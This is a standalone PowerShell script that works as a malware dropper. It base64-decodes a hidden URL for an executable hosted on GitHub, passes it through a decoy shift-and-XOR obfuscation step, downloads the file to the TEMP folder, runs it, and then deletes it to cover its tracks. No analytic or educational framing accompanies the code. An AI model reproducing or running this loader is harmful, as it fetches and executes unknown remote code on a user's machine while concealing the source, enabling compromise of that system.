function Get-RndChr {
    param (
        [int]$l
    )
    return -join ((65..90) | Get-Random -Count $l | ForEach-Object { [char]$_ })
}

$encUrl = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"

function Dec-B64 {
    param (
        [string]$encStr
    )
    try {
        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encStr))
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

$decUrl = Dec-B64 -encStr $encUrl

function Dwn-Fl {
    param (
        [string]$url
    )
    try {
        $output = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($url))
        $client = New-Object System.Net.WebClient
        $client.DownloadFile($url, $output)
        return $output
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

function Exe-Fl {
    param (
        [string]$filePath
    )
    try {
        Start-Process -FilePath $filePath -NoNewWindow -Wait
    } catch {
        Write-Error "Failed : $_"
    }
}

function Shft-Chr {
    param (
        [string]$inputStr,
        [int]$shft
    )
    try {
        $result = ""
        foreach ($chr in $inputStr.ToCharArray()) {
            $result += [char](([byte]$chr + $shft) -band 0xFF)
        }
        return $result
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

function Xor-Chr {
    param (
        [string]$inputStr,
        [int]$key
    )
    try {
        $result = ""
        foreach ($chr in $inputStr.ToCharArray()) {
            $result += [char](([byte]$chr -bxor $key) -band 0xFF)
        }
        return $result
    } catch {
        Write-Error "Failed : $_"
        return $null
    }
}

$obfUrl = Shft-Chr -inputStr $decUrl -shft 1
$obfUrl = Xor-Chr -inputStr $obfUrl -key 5

$deObfUrl = Xor-Chr -inputStr $obfUrl -key 5
$deObfUrl = Shft-Chr -inputStr $deObfUrl -shft -1

$flPath = Dwn-Fl -url $deObfUrl

if ($flPath) {
    Exe-Fl -filePath $flPath
    Remove-Item -Path $flPath
}
